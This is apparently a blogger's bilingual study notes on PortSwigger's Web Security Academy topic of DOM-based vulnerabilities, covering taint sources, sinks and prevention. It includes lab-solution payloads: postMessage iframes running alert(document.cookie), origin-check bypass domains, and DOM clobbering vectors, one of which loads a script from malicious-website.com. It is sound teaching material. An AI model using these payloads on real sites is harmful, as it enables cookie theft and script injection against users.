---
layout: article
title: WSAcademy 14 -- DOM-based vulnerabilities
mathjax: true
key: a00025
cover: /bkgs/1.png
modify_date: 2021-10-19
show_author_profile: true
excerpt_type: html
tag: 
- WSAcademy
- DOM
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是Web Security Academy的DOM-based vulnerabilities部分<!--more-->

原文：[DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)

# What is the DOM?

The Document Object Model （DOM，文档对象模型）是web浏览器对页面上元素的分层表示。

当网站包含接受攻击者可控制的值（称为源）的JavaScript时，会出现基于DOM的漏洞，并会将此值其传递到危险的函数（称为sink，即接收器）。

# Taint-flow vulnerabilities

许多基于DOM的漏洞可以追溯到客户端代码操纵攻击者可控制数据的方式问题。

## What is taint flow?

basics of taint flow between sources and sinks.

- **Sources**

  源是一个JavaScript属性，它接受可能受攻击者控制的数据。

  `location.search`属性从查询字符串读取输入

  最终，攻击者可以控制的任何属性都是潜在的来源。这包括引用URL（由**document.referer**字符串公开）、用户cookie（由**document.cookie**字符串公开）和web消息

- **Sinks**（接收器？）

  接收器是一种潜在危险的JavaScript函数或DOM对象，如果将攻击者控制的数据传递给它，可能会造成不良影响

  例如，`eval()`函数是一个接收器，因为它处理作为JavaScript传递给它的参数

  HTML接收器的一个示例是`document.body.innerHTML`，因为它可能允许攻击者注入恶意HTML并执行任意JavaScript。

  

  从根本上说，当网站将数据**从源传递到接收器**，然后接收器在客户端会话的上下文中以不安全的方式处理数据时，就会出现基于DOM的漏洞。

## Common sources

The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:

```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

DOM+reflected/stored XSS also be used as sources

**web-message source** as well

### Controlling the web-message source

如果目标文档信任发送方不会传输消息中的恶意数据，并通过将数据传递到接收器以不安全的方式处理数据，则这两个文档的联合行为可能允许攻击者危害用户，例如。

#### How to construct an attack using web messages as the source

Consider the following code:

```javascript
<script>
window.addEventListener('message', function(e){
eval(e.data);
});
</script>
```

This is vulnerable because an attacker could inject a JavaScript payload by constructing the following iframe:

```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('alert(1)','*')">
																		 （message，targetOrigin）
```

listener并不验证消息来源， and the postMessage() method specifies the targetOrigin "*"，listener接收接收payload并传递给sink，在这里即eval()

```html
lab1：
<iframe src="https://ac641fe71e17970c809306b0009d0010.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')">

lab2：
<iframe src="https://acdb1f991f170dde8046546b008700a6.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')">
```

事件listener发现“http:”字符串并继续将有效负载发送到`location.href`接收器，在客户端会话的上下文中调用alert（）函数。

#### Origin verification

For example, consider the following code:

```javascript
window.addEventListener('message',function(e){
	if(e.origin.indexOf('normal-website.com') > -1) {
		eval(e.data)
	}
})
```

you can use  http://www.normal-website.com.evil.net

The same flaw also applies to verification checks that rely on the `startsWith()` or `endsWith()` methods

```javascript
window.addEventListener('message',function(e){
	if(e.origin.endsWith('normal-website.com')) {
		eval(e.data)
	}
})
```

use http://www.malicious-websitenormal-website.com

```html
lab:
<iframe src=https://ac761ffa1e49ae4e80bc4424003600e0.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(document.cookie)\"}","*")'>
```

#### Which sinks can lead to DOM-based web-message vulnerabilities?

只要网站由于缺乏充分的来源验证而接受来自不受信任来源的web消息数据，传入消息事件侦听器使用的任何接收器都可能导致漏洞。

## Which sinks can lead to DOM-based vulnerabilities?

下面的列表提供了常见的基于DOM的漏洞的快速概述，以及可能导致每个漏洞的接收器示例。有关相关接收器的更全面列表，请单击下面的链接，以参阅特定于漏洞的页面。

| **DOM-based vulnerability**                                  | **Example sink**           |
| ------------------------------------------------------------ | -------------------------- |
| [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) LABS | document.write()           |
| [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection) LABS | window.location            |
| [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation) LABS | document.cookie            |
| [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection) | eval()                     |
| [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation) | document.domain            |
| [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning) | WebSocket()                |
| [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation) | someElement.src            |
| [Web-message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation) | postMessage()              |
| [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation) | setRequestHeader()         |
| [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation) | FileReader.readAsText()    |
| [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection) | ExecuteSql()               |
| [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation) | sessionStorage.setItem()   |
| [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection) | document.evaluate()        |
| [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection) | JSON.parse()               |
| [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation) | someElement.setAttribute() |
| [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service) | RegExp()                   |

### DOM-based open redirection

当脚本将攻击者可控制的数据写入可触发跨域导航的接收器时发生

例如，可以利用此行为促进针对网站用户的网络钓鱼攻击

以下是一些主要接收器可能导致基于DOM的开放重定向漏洞：

```
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
domElem.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()
```

- PREVENT:

In addition to the general measures described in the DOM-vulnerabilities topic, you should **避免从不信任的原动态设置重定向目标.**

### DOM-based cookie manipulation

一些基于DOM的漏洞允许攻击者操纵他们通常无法控制的数据。这会将通常安全的数据类型（如cookie）转换为潜在的源。脚本将攻击者可控制的数据写入cookie值时，会出现基于DOM的cookie操纵漏洞。

攻击者可以利用此漏洞构建URL，如果其他用户访问该URL，该URL将在**用户的cookie中设置任意值**

例如，如果JavaScript将数据从源写入document.cookie，而没有首先对其进行清理，则攻击者可以操纵单个cookie的值来注入任意值：

```js
document.cookie = 'cookieName='+location.hash.slice(1);
```

```html
lab：???
<iframe src="https://your-lab-id.web-security-academy.net/product?productId=1&'><script>alert(document.cookie)</script>" onload="if(!window.x)this.src='https://your-lab-id.web-security-academy.net';window.x=1;">
```

此漏洞的影响取决于相关cookie的作用大小

The `document.cookie` sink can lead to DOM-based cookie-manipulation vulnerabilities.

- PREVENT:

除了通用的以外还应该**避免从不被信任的源的数据动态写入cookie**

### DOM-based JavaScript injection

当脚本以JavaScript形式执行攻击者可控制的数据时，会出现基于DOM的JavaScript注入漏洞

攻击者可以利用该漏洞构建URL，如果其他用户访问该URL，将导致攻击者提供的任意JavaScript在用户浏览器会话的上下文中执行。

类似反射型xss



攻击者提供的代码可以执行多种操作，例如窃取受害者的会话令牌或登录凭据，代表受害者执行任意操作，甚至记录他们的击键。

The following are some of the main sinks that can lead to DOM-based JavaScript-injection vulnerabilities:

```
eval()
Function() constructor
setTimeout()
setInterval()
setImmediate()
execCommand()
execScript()
msSetImmediate()
range.createContextualFragment()
crypto.generateCRMFRequest()
```

- PREVENT:

you should avoid allowing data from any untrusted source to be executed as JavaScript.

### DOM-based document-domain manipulation

脚本使用攻击者可控制的数据设置`document.domain`属性时，且该属性在**同源策略中使用**



警告

首先，浏览器**允许使用子域或父域**，因此攻击者可以将目标页面的域切换到安全性较弱的相关网站的域。

其次，一些浏览器的quirks可以让用户**切换到完全不相关的域**



document.domain接收器可能导致基于DOM的文档域操作漏洞。



避免允许来自任何不受信任源的数据动态设置document.domain属性

### DOM-based WebSocket-URL poisoning

当脚本使用可控数据作为WebSocket连接的目标URL时，会发生WebSocket-URL poisoning。

构造URL，使用户的浏览器打开与攻击者控制的URL的WebSocket连接

`WebSocket`构造函数可能导致WebSocket URL中毒漏洞。

避免允许来自任何不受信任源的数据动态设置WebSocket连接的目标URL

### DOM-based link-manipulation attack

当脚本将攻击者可控制的数据写入当前页面内的导航目标时，例如可单击的链接或表单的提交URL

```
element.href
element.src
element.action
```

avoid allowing data from any untrusted source to dynamically set the target URL for links or forms.

### DOM-based Ajax request-header manipulation

使用Ajax使网站能够向服务器发出异步请求，这样web应用程序就可以动态更改页面上的内容，而无需重新加载整个页面

脚本将攻击者可控制的数据写入使用`XmlHttpRequest`对象发出的Ajax请求的请求头时，会出现漏洞

以下是一些可能导致基于DOM的Ajax请求头漏洞的主要接收器：

```
XMLHttpRequest.setRequestHeader()
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.globalEval()
$.globalEval()
```

avoid allowing data from any untrusted source dynamically set Ajax request headers.

### DOM-based local file-path manipulation

脚本将攻击者可控制的数据作为文件名参数传递给文件处理API

攻击者可以利用此漏洞构建URL，如果其他用户访问该URL，将导致该用户的浏览器打开任意本地文件。

可以检索文件数据或将数据写入配置文件

以下是一些主要接收器可能导致基于DOM的本地文件路径操纵漏洞：

```
FileReader.readAsArrayBuffer()
FileReader.readAsBinaryString()
FileReader.readAsDataURL()
FileReader.readAsText()
FileReader.readAsFile()
FileReader.root.getFile()
FileReader.root.getFile()
```

avoid allowing data from any untrusted source to dynamically pass a filename to a file-handling API.

### DOM-based client-side SQL injection

脚本以不安全的方式将攻击者可控制的数据合并到客户端SQL查询中

JavaScript数据库函数`executeSql()`可能导致客户端SQL注入漏洞。

在JavaScript `executeSql()`API中，可以使用查询字符？在查询字符串中指定参数化项？

确保对所有数据库访问使用参数化查询（也称为预处理语句）

- 指定查询的结构，为每个用户输入项保留占位符。

- 指定每个占位符的内容。

- 由于查询的结构已在第一步中定义，因此第二步中格式错误的数据不可能干扰查询结构

### DOM-based HTML5-storage manipulation

当脚本将攻击者可控制的数据存储在web浏览器的HTML5存储（`localStorage`或`sessionStorage`）中时，会出现漏洞

此行为本身并不构成安全漏洞。

但是，如果应用程序稍后从存储中读回数据并以不安全的方式进行处理，攻击者可能会利用存储机制进行其他基于DOM的攻击，如xss和js注入

以下是可能导致基于DOM的HTML5存储操作漏洞的一些主要接收器：

```
sessionStorage.setItem()
localStorage.setItem()
```

avoid allowing data from any untrusted source to be placed in HTML5 storage.

### DOM-based client-side XPath injection

脚本将攻击者可控制的数据合并到XPath查询中时会出现漏洞

触发执行任意XPath查询，这可能导致网站检索和处理不同的数据。

以下是可能导致基于DOM的XPath注入漏洞的一些主要接收器：

```
document.evaluate()
someDOMElement.evaluate()
```

avoid allowing data from any untrusted source to be incorporated into XPath queries.

### DOM-based client-side JSON injection

当脚本将攻击者可控制的数据合并到一个字符串中，该字符串被解析为JSON数据结构，然后由应用程序处理时，就会出现漏洞

sinks：

```
JSON.parse()
jQuery.parseJSON()
$.parseJSON()
```

avoid allowing strings containing data from any untrusted source to be parsed as JSON.

### DOM-data manipulation

当脚本将攻击者可控制的数据写入DOM中可见UI或客户端逻辑中使用的字段时，会出现漏洞

将修改客户端UI的外观或行为

可被反射和存储的基于DOM的攻击利用。



如果攻击者能够更改元素的`src`属性，则可能会通过导入恶意JavaScript文件诱使用户执行意外操作。

以下是可能导致DOM数据操作漏洞的一些主要接收器：

```
scriptElement.src
scriptElement.text
scriptElement.textContent
scriptElement.innerText
someDOMElement.setAttribute()
someDOMElement.search
someDOMElement.text
someDOMElement.textContent
someDOMElement.innerText
someDOMElement.outerText
someDOMElement.value
someDOMElement.name
someDOMElement.target
someDOMElement.method
someDOMElement.type
someDOMElement.backgroundImage
someDOMElement.cssText
someDOMElement.codebase
document.title
document.implementation.createHTMLDocument()
history.pushState()
history.replaceState()
```

you should avoid allowing data from any untrusted source to be dynamically written to DOM-data fields

### DOM-based denial of service

当脚本以不安全的方式将攻击者可控制的数据传递给有问题的平台API（例如其调用可能导致用户计算机消耗过多CPU或磁盘空间的API）时，就会出现漏洞

例如，拒绝在本地存储中存储数据的尝试或终止繁忙的脚本。

以下是一些可能导致基于DOM的拒绝服务漏洞的主要接收器：

```
requestFileSystem()
RegExp()
```

avoid allowing data from any untrusted source to dynamically pass data into problematic platform APIs.

## How to prevent DOM-based taint-flow vulnerabilities

There is **no single action** you can take to eliminate the threat of DOM-based attacks entirely

the **most effective way** to avoid DOM-based vulnerabilities is to avoid allowing data from any untrusted source to **dynamically alter the value that is transmitted to any sink**.

If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the **client-side code**

# DOM clobbering

一种高级技术，将**HTML注入**到页面以操作DOM并最终**更改网站上JavaScript的行为**

DOM clobbering在不可能使用XSS的情况下特别有用，但是您可以控制页面上的一些HTML，其中属性id或name被HTML过滤器白名单

DOM clobbering的最常见形式是**使用 **anchor element**覆盖全局变量**，然后应用程序以不安全的方式使用全局变量，例如生成动态脚本URL。

术语clobbering来自这样一个事实：“clobbing”一个对象的全局变量或属性，并用DOM节点或HTML集合覆盖它

## How to exploit DOM-clobbering vulnerabilities

A common pattern used by JavaScript developers is:

```
var someObject = window.someObject || {};
```

If you can control some of the HTML on the page, you can clobber the someObject reference with a DOM node, such as an anchor. Consider the following code:

```js
<script>
window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
};
</script>
```

To exploit this vulnerable code, you could inject the following HTML to clobber the someObject reference with an anchor element:

```js
<a id=someObject><a id=someObject name=url href=//malicious-website.com/malicious.js>
```

由于两个锚使用相同的ID，DOM将它们分组到一个DOM集合中。 DOM clobbering向量随即用这个DOM集合覆盖`someObject`引用。在最后一个锚点元素上使用`name`属性来关闭指向外部脚本的`someObject`对象的`url`属性。

```js
lab1：
vuln code ：
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}

<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">

###第二个锚点中的name属性包含值“avatar”，该值将用href属性的内容替换avatar属性。
#请注意，该站点使用DOMPurify过滤器，但是，DOMPurify允许使用 cid: 协议，它不使用URL编码双引号
#当您进行第二次post时，浏览器使用 newly-clobbered的全局变量，该变量将有效负载走私到OneError事件处理程序中并触发alert（）。


```

另一种常见的技术是将`form`元素与诸如`input`到clobber DOM属性之类的元素一起使用
例如，clobbering `attributes`属性使您能够绕过在其逻辑中使用它的客户端筛选器，如：

```html
<form onclick=alert(1)><input id=attributes>Click me
```

在这种情况下，客户端过滤器将遍历DOM并遇到一个白名单`form`元素。通常，过滤器将循环遍历`form`元素的`attributes`属性，并删除任何列入黑名单的属性。但是，由于`attributes`属性已与`input`元素合并，因此过滤器将通过`input`素进行循环。由于`input`元素具有未定义的长度，因此不满足过滤器`for`循环的条件（例如`i<element.attributes.length`），过滤器只是移动到下一个元素。这会导致过滤器完全忽略`onclick`事件，从而允许在浏览器中调用`alert（）`函数。

```html
lab2：
<form id=x tabindex=0 onfocus=alert(document.cookie)><input id=attributes>

<iframe src=https://your-lab-id.web-security-academy.net/post?postId=3 onload="setTimeout(someArgument=>this.src=this.src+'#x',500)">
```

library使用`attributes`属性过滤HTML属性。但是，仍然可以clobber(删除？) `attributes`属性本身，从而导致长度未定义。这允许我们将任何想要的属性注入表单元素。在本例中，我们使用`onfocus`属性走私一个`alert（）`函数。

加载`iframe`时，在500毫秒延迟后，它会将`#x`片段添加到页面URL的末尾。延迟是必要的，以确保在执行JavaScript之前加载包含注入的注释。这会**导致浏览器**focus **ID为“x”的元素**，即在注释中创建的表单。`onfocus`事件处理程序然后执行`alert（）`负载。

## How to prevent DOM-clobbering attacks

- 检查**对象和函数是否合法。**

  如果要过滤DOM，请确保检查对象或函数是否不是DOM节点。

- 避免错误的代码模式。

  **避免**将全局变量与 **logical OR operator**结合使用

- 使用经过良好测试的库

  例如DOMPurify